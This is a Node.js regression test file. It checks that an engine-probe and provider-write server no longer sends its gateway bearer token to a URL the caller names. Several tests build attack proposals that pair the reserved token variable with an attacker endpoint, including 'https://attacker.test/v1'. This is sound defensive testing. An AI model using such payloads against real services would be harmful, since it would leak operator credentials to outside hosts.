// Handler-level regression tests for the credential-handling defect closed in
// v0.3.0: the engine-probe path let an untrusted caller name BOTH an environment
// variable (`apiKeyEnv`) AND a destination (`baseUrl`) in a proposal, and the
// desk would read that variable out of ITS OWN process — which legitimately
// holds the operator-equivalent gateway bearer — and send it as
// `Authorization: Bearer <value>` to the caller-supplied address.
//
// These drive the two HTTP handlers directly (/api/engines/probe and the
// /api/engines provider write) plus the agent-write path, so the fix is proven
// at the entrypoints an attacker on the loopback/tailnet port would reach, not
// only in the unit beneath them. The browser CSRF vector is already closed by
// sameOrigin; the requests here are the server-side ones sameOrigin does not
// stop.
//
// server.mjs derives its config/engines/agents paths from the environment at
// import time, so those are set BEFORE it is imported. `node --test` isolates
// each test file in its own process, so these writes cannot reach another suite.

import assert from "node:assert/strict";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Readable } from "node:stream";
import test from "node:test";

import { startMockEngine } from "./engine-mocks.mjs";

// The one operator-equivalent secret the front door legitimately carries in its
// environment (README: "the front door ... attaches the bearer from its own
// environment"). The whole defect was that a caller could name it and have the
// desk ship it out. If it ever appears at a caller-named endpoint, that is the
// exfiltration.
const SENTINEL = "SENTINEL-gateway-token-that-must-never-travel";

function station() {
  return {
    gateway: { mode: "local", port: 18789, reload: { mode: "hybrid" } },
    channels: {},
    bindings: [],
    browser: { enabled: false },
    tools: { deny: ["browser"], elevated: { enabled: false } },
    commands: { ownerAllowFrom: ["telegram:1"] },
    meta: { lastTouchedVersion: "2026.7.1-2" },
    models: {
      mode: "merge",
      providers: {
        "ollama-cloud-openai": {
          baseUrl: "https://ollama.com/v1",
          api: "openai-completions",
          auth: "api-key",
          apiKey: { source: "env", provider: "default", id: "OLLAMA_CLOUD_API_KEY" },
          authHeader: true,
          timeoutSeconds: 120,
          models: [{ id: "glm-5.2", name: "GLM 5.2", input: ["text"], contextWindow: 128000, maxTokens: 8192 }],
        },
      },
    },
    agents: {
      defaults: {
        workspace: "~/.openclaw/workspace",
        model: { primary: "ollama-cloud-openai/glm-5.2", fallbacks: [] },
        sandbox: { mode: "all", backend: "docker" },
        skills: [],
      },
      list: [{ id: "coordinator", tools: { profile: "core" }, sandbox: { mode: "all" } }],
    },
  };
}

const dir = await mkdtemp(join(tmpdir(), "orderly-engines-sec-"));
const configPath = join(dir, "openclaw.json");
await writeFile(configPath, `${JSON.stringify(station(), null, 2)}\n`);

process.env.ORDERLY_CONFIG = configPath;
process.env.ORDERLY_ENGINES_CONFIG = join(dir, "engines.json");
process.env.ORDERLY_AGENTS_ROOT = join(dir, "agents");
process.env.OPENCLAW_GATEWAY_TOKEN = SENTINEL;
delete process.env.ORDERLY_SETTINGS_WRITE; // the write path must be enabled

const { handleEnginesProbe, handleEnginesPost, handleAgentsPost, bindingFromProposal } =
  await import("../server.mjs");

test.after(() => rm(dir, { recursive: true, force: true }));

// A same-origin POST (no Origin / no Sec-Fetch-Site header → sameOrigin passes,
// as it does for a request that reaches the loopback port directly).
function post(bodyObj) {
  // Buffer chunks, because readBody does Buffer.concat on what it receives.
  const req = Readable.from([Buffer.from(JSON.stringify(bodyObj))]);
  req.method = "POST";
  req.headers = {};
  return req;
}

function collector() {
  return {
    statusCode: null,
    body: "",
    headers: {},
    setHeader(k, v) {
      this.headers[String(k).toLowerCase()] = v;
    },
    writeHead(status) {
      this.statusCode = status;
      return this;
    },
    end(chunk) {
      if (chunk !== undefined && chunk !== null) this.body += String(chunk);
    },
  };
}

async function drive(handler, bodyObj) {
  const res = collector();
  await handler(post(bodyObj), res);
  let json = null;
  try {
    json = JSON.parse(res.body);
  } catch {
    /* some paths end without a body */
  }
  return { res, json };
}

// No Authorization header ever reached the recorder, and the sentinel appears in
// nothing the recorder saw. This is the assertion the exfil primitive fails.
function assertNothingLeaked(engine, where) {
  assert.deepEqual(
    engine.calls.authHeaders,
    [],
    `${where}: an Authorization header reached the caller-named endpoint`,
  );
  const seen = JSON.stringify(engine.calls);
  assert.equal(seen.includes(SENTINEL), false, `${where}: the sentinel secret reached the endpoint`);
}

// ---------------------------------------------------------------------------
// /api/engines/probe
// ---------------------------------------------------------------------------

test("POST /api/engines/probe: a proposal naming the gateway token + an attacker URL leaks nothing", async (t) => {
  const attacker = await startMockEngine(); // records every request it receives
  t.after(() => attacker.close());

  const { res, json } = await drive(handleEnginesProbe, {
    proposal: {
      providerId: "attacker",
      baseUrl: attacker.baseUrl,
      modelId: "llama3.1:8b",
      api: "openai-completions",
      auth: "api-key",
      apiKeyEnv: "OPENCLAW_GATEWAY_TOKEN", // the operator-equivalent secret in this process
      contextWindow: 8192,
      maxTokens: 1024,
      toolProtocol: "none",
    },
  });

  assertNothingLeaked(attacker, "probe");
  // The desk did not even open a connection to the caller-named address for a
  // credentialed proposal — it is deferred to the gateway.
  assert.equal(attacker.calls.models, 0);
  assert.equal(attacker.calls.completions, 0);
  assert.equal(res.statusCode, 200);
  assert.equal(json.deferred, true);
  assert.match(json.message, /gateway/);
  assert.equal(res.body.includes(SENTINEL), false);
});

test("POST /api/engines/probe: a legitimate no-auth local endpoint still probes clean, with no auth header", async (t) => {
  const local = await startMockEngine(); // no key required
  t.after(() => local.close());

  const { res, json } = await drive(handleEnginesProbe, {
    proposal: {
      providerId: "friends-box",
      baseUrl: local.baseUrl,
      modelId: "llama3.1:8b",
      api: "openai-completions",
      auth: "none",
      contextWindow: 8192,
      maxTokens: 1024,
      toolProtocol: "none",
    },
  });

  assert.equal(res.statusCode, 200);
  assert.equal(json.ok, true);
  assert.notEqual(json.deferred, true);
  // The endpoint was really reached — the common local case still works — and
  // every request to it carried no Authorization header at all.
  assert.equal(local.calls.models, 1);
  assert.deepEqual(new Set(local.calls.authHeaders), new Set([null]));
});

// ---------------------------------------------------------------------------
// /api/engines (provider write)
// ---------------------------------------------------------------------------

test("POST /api/engines write: an engine definition naming the gateway token + an attacker URL leaks nothing", async (t) => {
  const attacker = await startMockEngine();
  t.after(() => attacker.close());

  const { res } = await drive(handleEnginesPost, {
    provider: {
      providerId: "exfil",
      baseUrl: attacker.baseUrl,
      api: "openai-completions",
      auth: "api-key",
      apiKeyEnv: "OPENCLAW_GATEWAY_TOKEN",
      models: [{ id: "llama3.1:8b", name: "Llama", contextWindow: 8192, maxTokens: 1024 }],
    },
  });

  // The provider write probes before it persists; that probe is where the leak
  // used to happen. It sends nothing to the caller-named endpoint.
  assertNothingLeaked(attacker, "provider-write");
  assert.equal(res.body.includes(SENTINEL), false);
  assert.notEqual(res.statusCode, null);
});

// The second-order half: the desk stored only a NAME, but naming a variable the
// gateway holds is a staged exfil — a seat later pointed at that provider would
// have the GATEWAY read it and ship it out. So the write is refused BY NAME
// before anything is stored, at every reserved variable.
for (const reserved of ["OPENCLAW_GATEWAY_TOKEN", "TELEGRAM_BOT_TOKEN"]) {
  test(`POST /api/engines write: naming ${reserved} as a provider key is refused by name, and stores nothing`, async () => {
    const { res, json } = await drive(handleEnginesPost, {
      provider: {
        providerId: "exfil",
        baseUrl: "https://attacker.test/v1",
        api: "openai-completions",
        auth: "api-key",
        apiKeyEnv: reserved,
        models: [{ id: "llama3.1:8b", name: "Llama", contextWindow: 8192, maxTokens: 1024 }],
      },
    });

    assert.equal(res.statusCode, 400);
    assert.match(json.error, new RegExp(reserved));
    // Nothing was persisted: the config still holds no "exfil" provider.
    const config = JSON.parse(await readFile(configPath, "utf8"));
    assert.equal("exfil" in (config.models?.providers ?? {}), false);
  });
}

// ---------------------------------------------------------------------------
// /api/agents (create / update) — unknown keys are refused BY NAME, not dropped
// ---------------------------------------------------------------------------

test("POST /api/agents create: an unknown field is refused by name, not silently dropped", async () => {
  const { res, json } = await drive(handleAgentsPost, {
    action: "create",
    name: "Nimbus",
    // Not a settable field; the typed envelope must reject it, not ignore it.
    capabilityBindings: ["deep_research"],
  });
  assert.equal(res.statusCode, 400);
  assert.match(json.error, /capabilityBindings/);
});

test("POST /api/agents update: an unknown field is refused by name, not silently dropped", async () => {
  const { res, json } = await drive(handleAgentsPost, {
    action: "update",
    id: "some-agent",
    // Identity policy is not editable from this desk; naming it must be an error.
    sandbox: { mode: "all" },
  });
  assert.equal(res.statusCode, 400);
  assert.match(json.error, /sandbox/);
});

// ---------------------------------------------------------------------------
// The untrusted-input boundary both engine handlers share
// ---------------------------------------------------------------------------

test("bindingFromProposal carries caller-chosen auth fields, and probing one still sends nothing", async (t) => {
  const { probeEngine } = await import("../engines.mjs");
  const attacker = await startMockEngine();
  t.after(() => attacker.close());

  // The exact object handleEnginesPost builds from an engine definition, and the
  // shape handleEnginesProbe builds from a proposal, both flow through here.
  const binding = bindingFromProposal({
    providerId: "attacker",
    baseUrl: attacker.baseUrl,
    api: "openai-completions",
    auth: "api-key",
    apiKeyEnv: "OPENCLAW_GATEWAY_TOKEN",
    modelId: "llama3.1:8b",
    contextWindow: 8192,
    maxTokens: 1024,
  });
  const result = await probeEngine({ binding });

  assert.equal(result.deferred, true);
  assertNothingLeaked(attacker, "bindingFromProposal");
});
